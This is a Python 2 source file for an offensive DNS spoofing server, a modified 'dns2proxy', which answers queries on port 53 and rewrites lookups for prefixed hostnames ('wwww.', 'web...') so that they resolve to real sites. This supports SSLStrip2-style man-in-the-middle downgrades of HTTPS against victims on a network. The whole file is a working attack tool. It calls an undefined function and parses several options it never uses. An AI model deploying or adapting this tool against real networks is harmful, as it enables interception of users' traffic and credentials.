#!/usr/bin/python2
'''
dns2proxy for offensive cybersecurity v1.0


python dns2proxy.py -h for Usage.

Example:
python2.6 dns2proxy.py -i eth0 -u 192.168.1.101 -d 192.168.1.200

Example for no forwarding (only configured domain based queries and spoofed hosts):
  python2.6 dns2proxy.py -i eth0 -noforward

Example for no forwarding but add IPs
  python dns2proxy.py -i eth0 -I 192.168.1.101,90.1.1.1,155.54.1.1 -noforward

Author: Leonardo Nve ( leonardo.nve@gmail.com)
Modified by: Gabriele Gemmi and Lorenzo Brugnera
'''


import dns.message
import dns.rrset
import dns.resolver
import socket
import numbers
import threading
from struct import *
import datetime
import pcapy
import os
import signal
import errno
from time import sleep, time
import argparse


requests = {}

parser = argparse.ArgumentParser()
parser.add_argument("-N", "--noforward", help="DNS Fowarding OFF (default ON)", action="store_true")
parser.add_argument("-I", "--ips", help="List of IPs to add separated with commas", default=None)
parser.add_argument("-S", "--silent", help="Silent mode", action="store_true")
parser.add_argument("-A", "--adminIP", help="Administrator IP for no filtering", default="192.168.0.1")
parser.add_argument("-p", "--directory", help="Use this option to specify the directory for the config files", default="")
parser.add_argument("-o", "--output_to_file", help="Use this option to specify the directory for the config files", default="")

args = parser.parse_args()

DIR_PATH = args.directory
if len(DIR_PATH)>0 and DIR_PATH[-1]!="/":
    DIR_PATH += "/"

LOGREQFILE = DIR_PATH + "dnslog.txt"
LOGSNIFFFILE = DIR_PATH + "snifflog.txt"
LOGALERTFILE = DIR_PATH + "dnsalert.txt"
RESOLVCONF = DIR_PATH + "resolv.conf"


debug = not args.silent
adminip = args.adminIP
Forward = not args.noforward

fake_ips = []
# List of of ips
if args.ips is not None:
    for ip in args.ips.split(","):
        fake_ips.append(ip)

Resolver = dns.resolver.Resolver()

######################
# GENERAL SECTION    #
######################


def save_req(lfile, str):
    f = open(lfile, "a")
    f.write(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + ' ' + str)
    f.close()


def SIGUSR1_handle(signalnum, frame):
    global noserv
    global Resolver
    noserv = False
    DEBUGLOG('Reconfiguring....')
    process_files()
    Resolver.reset()
    Resolver.read_resolv_conf(RESOLVCONF)
    return



def DEBUGLOG(str):
    global debug
    if debug:
        print str
    return


def handler_msg(id):
    os.popen('./handler_msg.sh %s >> handler_msg.log 2>> handler_msg_error.log &'%id.replace('`','_').replace(';','_').replace('|','_').replace('&','_'))
    return

######################
#  DNS SECTION       #
######################

def DNSanswer(name, type):
    global Resolver

    DEBUGLOG('Query = ' + name + ' ' + type)
    try:
        answers = Resolver.query(name, type)
    except Exception, e:
        DEBUGLOG('Exception...')
        return 0
    return answers


def requestHandler(address, message):
    resp = None
    qtime = time()
    seconds_betwen_ids = 1
    try:
        message_id = ord(message[0]) * 256 + ord(message[1])
        DEBUGLOG('msg id = ' + str(message_id))
        if message_id in serving_ids:
            if (qtime - serving_ids[message_id]) < seconds_betwen_ids:
                DEBUGLOG('I am already serving this request.')
                return
        serving_ids[message_id] = qtime
        DEBUGLOG('Client IP: ' + address[0])
        src_ip = address[0]
        try:
            # parse the dns message
            msg = dns.message.from_wire(message)
            try:
                op = msg.opcode()
                if op == 0:
                    # standard and inverse query
                    qs = msg.question
                    if len(qs) > 0:
                        q = qs[0]
                        DEBUGLOG('request is ' + str(q))
                        save_req(LOGREQFILE, 'Client IP: ' + address[0] + '    request is    ' + str(q) + '\n')
                        if q.rdtype == dns.rdatatype.A:
                            DEBUGLOG('Doing the A query....')
                            resp = std_A_qry(msg, src_ip)
                        elif q.rdtype == dns.rdatatype.PTR:
                            #DEBUGLOG('Doing the PTR query....')
                            resp = std_PTR_qry(msg)
                        elif q.rdtype == dns.rdatatype.MX:
                            DEBUGLOG('Doing the MX query....')
                            resp = std_MX_qry(msg)
                        elif q.rdtype == dns.rdatatype.TXT:
                            #DEBUGLOG('Doing the TXT query....')
                            resp = std_TXT_qry(msg)
                        elif q.rdtype == dns.rdatatype.AAAA:
                            #DEBUGLOG('Doing the AAAA query....')
                            resp = std_AAAA_qry(msg)
                        else:
                            # not implemented
                            resp = make_response(qry=msg, RCODE=4)  # RCODE =  4    Not Implemented
                else:
                    # not implemented
                    resp = make_response(qry=msg, RCODE=4)  # RCODE =  4    Not Implemented

            except Exception, e:
                DEBUGLOG('got ' + repr(e))
                resp = make_response(qry=msg, RCODE=2)  # RCODE =  2    Server Error
                DEBUGLOG('resp = ' + repr(resp.to_wire()))
        except Exception, e:
            DEBUGLOG('got ' + repr(e))
            resp = make_response(id=message_id, RCODE=1)  # RCODE =  1    Format Error
            DEBUGLOG('resp = ' + repr(resp.to_wire()))
    except Exception, e:
        # message was crap, not even the ID
        DEBUGLOG('got ' + repr(e))
    #If a response has been forged
    if resp:
        # send the answer back to the client
        s.sendto(resp.to_wire(), address)


def std_PTR_qry(msg):
    qs = msg.question
    DEBUGLOG( str(len(qs)) + ' questions.')
    iparpa = qs[0].to_text().split(' ', 1)[0]
    DEBUGLOG('Host: ' + iparpa)
    resp = make_response(qry=msg)
    hosts = DNSanswer(iparpa[:-1], 'PTR')
    if isinstance(hosts, numbers.Integral):
        DEBUGLOG('No host....')
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
        return resp

    for host in hosts:
        DEBUGLOG('Adding ' + host.to_text())
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.PTR, host.to_text())
        resp.answer.append(rrset)

    return resp


def std_MX_qry(msg):
    qs = msg.question
    DEBUGLOG(str(len(qs)) + ' questions.')
    iparpa = qs[0].to_text().split(' ', 1)[0]
    DEBUGLOG('Host: ' + iparpa)
    resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
    return resp
    #Temporal disable MX responses
    resp = make_response(qry=msg)
    hosts = DNSanswer(iparpa[:-1], 'MX')
    if isinstance(hosts, numbers.Integral):
        DEBUGLOG('No host....')
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
        return resp

    for host in hosts:
        DEBUGLOG('Adding ' + host.to_text())
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.MX, host.to_text())
        resp.answer.append(rrset)

    return resp


def std_TXT_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)

    host = iparpa[:-1]
    punto = host.find(".")
    dominio = host[punto:]
    host = "."+host
    spfresponse = ''

    hosts = DNSanswer(iparpa[:-1], 'TXT')
    if isinstance(hosts, numbers.Integral):
        print 'No host....'
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3    NXDOMAIN
        return resp

    for host in hosts:
        print 'Adding ' + host.to_text()
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.TXT, host.to_text())
        resp.answer.append(rrset)

    return resp

def std_SPF_qry(msg):
    qs = msg.question
    print str(len(qs)) + ' questions.'
    iparpa = qs[0].to_text().split(' ', 1)[0]
    print 'Host: ' + iparpa
    resp = make_response(qry=msg)
    hosts = DNSanswer(iparpa[:-1], 'SPF')
    if isinstance(hosts, numbers.Integral):
        print 'No host....'
        resp = make_response(qry=msg, RCODE=3)  # RCODE =  3    NXDOMAIN
        return resp

    for host in hosts:
        print 'Adding ' + host.to_text()
        rrset = dns.rrset.from_text(iparpa, 1000, dns.rdataclass.IN, dns.rdatatype.SPF, host.to_text())
        resp.answer.append(rrset)

    return resp

def std_AAAA_qry(msg):
    resp = make_response(qry=msg, RCODE=3)  # RCODE =  3    NXDOMAIN
    return resp

def std_A_qry(msg, src_ip):
    global requests
    global fake_ips

    qs = msg.question
    DEBUGLOG(str(len(qs)) + ' questions.')
    resp = make_response(qry=msg)
    for q in qs:
        qname = q.name.to_text()[:-1]
        DEBUGLOG('q name = ' + qname)
        host = qname.lower()
        ips = DNSanswer(qname.lower(), 'A')
        # If the domain requested doesn't exists, strips the domaina adding a 4th w
        if isinstance(ips, numbers.Integral):
            # SSLSTRIP2 transformation
            real_domain = ''
            # EDIT HERE:
            # if the host starts with "wwww." remove one 'w'
            # otherwise remove the string that you added ("web")
            #
            #
            if host[:5] == 'wwww.':
                real_domain = host[1:]
            else:
                real_domain = host[3:]
            #
            #
            # STOP EDITING HERE:

            # If the real domain exists return the answer to the client
            if real_domain != '':
                DEBUGLOG('SSLStrip2 transforming host: %s => %s ...' % (host, real_domain))
                ips = DNSanswer(real_domain, 'A')
        # If the real domain doesn't exist answer with NXDOMAIN
        if isinstance(ips, numbers.Integral):
            DEBUGLOG('No host....')
            resp = make_response(qry=msg, RCODE=3)  # RCODE =  3	NXDOMAIN
            return resp

        requests[src_ip] = ips[0]

        ttl = 1
        # Forge the message answer for the victim
        for realip in ips:
            DEBUGLOG('Adding real IP  = ' + realip.to_text())
            rrset = dns.rrset.from_text(q.name, ttl, dns.rdataclass.IN, dns.rdatatype.A, realip.to_text())
            resp.answer.append(rrset)
    return resp


def make_response(qry=None, id=None, RCODE=0):
    if qry is None and id is None:
        raise Exception, 'bad use of make_response'
    if qry is None:
        resp = dns.message.Message(id)
        # QR = 1
        resp.flags |= dns.flags.QR
        if RCODE != 1:
            raise Exception, 'bad use of make_response'
    else:
        resp = dns.message.make_response(qry)
    resp.flags |= dns.flags.AA
    resp.flags |= dns.flags.RA
    resp.set_rcode(RCODE)
    return resp

if __name__ == "__main__":
    # Initialize the DNS resolver
    Resolver.reset()
    Resolver.read_resolv_conf(RESOLVCONF)
    Resolver.lifetime = 1
    Resolver.timeout = 1
    signal.signal(signal.SIGUSR1, SIGUSR1_handle)
    # Open the socket on port 53
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('', 53))
    if Forward:
        DEBUGLOG('DNS Forwarding enabled....')
    else:
        DEBUGLOG('DNS Forwarding disabled....')

    DEBUGLOG('binded to UDP port 53.')
    serving_ids = {}
    noserv = True

    while True:
        if noserv:
            DEBUGLOG('waiting requests.')
        try:
            # Receive a DNS request
            message, address = s.recvfrom(1024)
            noserv = True
        except socket.error as (code, msg):
            if code != errno.EINTR:
                raise
        if noserv:
            # Handle the DNS request
            DEBUGLOG('serving a request.')
            requestHandler(address, message)
